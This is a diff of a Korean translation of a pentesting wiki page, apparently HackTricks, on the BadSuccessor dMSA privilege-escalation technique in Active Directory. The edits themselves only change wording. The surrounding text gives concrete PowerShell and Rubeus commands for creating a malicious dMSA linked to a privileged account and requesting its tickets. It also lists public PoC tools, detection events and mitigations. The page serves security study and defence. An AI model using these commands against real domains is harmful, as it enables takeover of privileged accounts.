@@ -4,7 +4,7 @@
 
 ## 개요
 
-Delegated Managed Service Accounts (**dMSA**)는 Windows Server 2025에 탑재된 **gMSA**의 차세대 후계자입니다. 합법적인 마이그레이션 워크플로우는 관리자가 *오래된* 계정(사용자, 컴퓨터 또는 서비스 계정)을 dMSA로 교체하면서 권한을 투명하게 유지할 수 있도록 합니다. 이 워크플로우는 `Start-ADServiceAccountMigration` 및 `Complete-ADServiceAccountMigration`과 같은 PowerShell cmdlet을 통해 노출되며, **dMSA 객체**의 두 LDAP 속성에 의존합니다:
+Delegated Managed Service Accounts (**dMSA**)는 Windows Server 2025에 탑재된 **gMSA**의 차세대 후계자입니다. 합법적인 마이그레이션 워크플로우는 관리자가 *오래된* 계정(사용자, 컴퓨터 또는 서비스 계정)을 dMSA로 교체하면서 권한을 투명하게 유지할 수 있도록 합니다. 이 워크플로우는 `Start-ADServiceAccountMigration` 및 `Complete-ADServiceAccountMigration`과 같은 PowerShell cmdlet을 통해 노출되며, **dMSA 객체**의 두 가지 LDAP 속성에 의존합니다:
 
 * **`msDS-ManagedAccountPrecededByLink`** – *DN 링크*로서 대체된(오래된) 계정.
 * **`msDS-DelegatedMSAState`**       – 마이그레이션 상태 (`0` = 없음, `1` = 진행 중, `2` = *완료됨*).
@@ -15,14 +15,14 @@ Delegated Managed Service Accounts (**dMSA**)는 Windows Server 2025에 탑재�
 
 ### 공격 전제 조건
 
-1. **조직 단위(OU)** 내에서 객체를 생성할 수 있는 *권한이 있는* 계정과 다음 중 하나 이상을 보유해야 합니다:
+1. **조직 단위(OU)** 내에서 객체를 생성할 수 있는 *권한이 있는* 계정 *및* 다음 중 하나 이상을 보유해야 합니다:
 * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 객체 클래스
 * `Create Child` → **`All Objects`** (일반 생성)
 2. LDAP 및 Kerberos에 대한 네트워크 연결(표준 도메인 가입 시나리오 / 원격 공격).
 
 ## 취약한 OU 열거하기
 
-Unit 42는 각 OU의 보안 설명자를 파싱하고 필요한 ACE를 강조하는 PowerShell 도우미 스크립트를 공개했습니다:
+Unit 42는 각 OU의 보안 설명자를 파싱하고 필요한 ACE를 강조 표시하는 PowerShell 도우미 스크립트를 공개했습니다:
 ```powershell
 Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
 ```
@@ -33,7 +33,7 @@ Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
 
 ## Exploitation Steps
 
-쓰기 가능한 OU가 식별되면 공격은 단 3개의 LDAP 쓰기 작업만 남습니다:
+쓰기 가능한 OU가 식별되면 공격은 단 3개의 LDAP 쓰기만 남습니다:
 ```powershell
 # 1. Create a new delegated MSA inside the delegated OU
 New-ADServiceAccount -Name attacker_dMSA \
@@ -49,15 +49,15 @@ Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
 ```
 복제 후 공격자는 단순히 **logon**하여 `attacker_dMSA$`로 로그인하거나 Kerberos TGT를 요청할 수 있습니다. Windows는 *superseded* 계정의 토큰을 생성합니다.
 
-### 자동화
+### Automation
 
-여러 공개 PoC가 비밀번호 검색 및 티켓 관리를 포함한 전체 워크플로를 래핑합니다:
+여러 공개 PoC는 비밀번호 검색 및 티켓 관리를 포함한 전체 워크플로를 래핑합니다:
 
 * SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
 * BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
 * NetExec 모듈 – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
 
-### 사후 활용
+### Post-Exploitation
 ```powershell
 # Request a TGT for the dMSA and inject it (Rubeus)
 Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
@@ -77,15 +77,15 @@ OU에서 **객체 감사**를 활성화하고 다음 Windows 보안 이벤트를
 * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
 * **2946** – dMSA에 대한 TGT 발급
 
-`4662` (속성 수정), `4741` (컴퓨터/서비스 계정 생성) 및 `4624` (후속 로그온)을 상관관계 분석하면 BadSuccessor 활동이 빠르게 드러납니다. **XSIAM**과 같은 XDR 솔루션은 즉시 사용할 수 있는 쿼리를 제공합니다 (참조를 참조하십시오).
+`4662` (속성 수정), `4741` (컴퓨터/서비스 계정 생성) 및 `4624` (후속 로그온)를 상관관계 분석하면 BadSuccessor 활동이 빠르게 드러납니다. **XSIAM**과 같은 XDR 솔루션은 즉시 사용할 수 있는 쿼리를 제공합니다 (참조를 참조하십시오).
 
 ## 완화
 
 * **최소 권한** 원칙을 적용합니다 – 신뢰할 수 있는 역할에만 *서비스 계정* 관리를 위임합니다.
 * 명시적으로 필요하지 않은 OU에서 `Create Child` / `msDS-DelegatedManagedServiceAccount`를 제거합니다.
-* 위에 나열된 이벤트 ID를 모니터링하고 dMSA를 생성하거나 편집하는 *비티어-0* 신원에 대해 경고합니다.
+* 위에 나열된 이벤트 ID를 모니터링하고 dMSA를 생성하거나 편집하는 *비-티어 0* 신원에 대해 경고합니다.
 
-## 추가 정보
+## 참조
 
 {{#ref}}
 golden-dmsa-gmsa.md
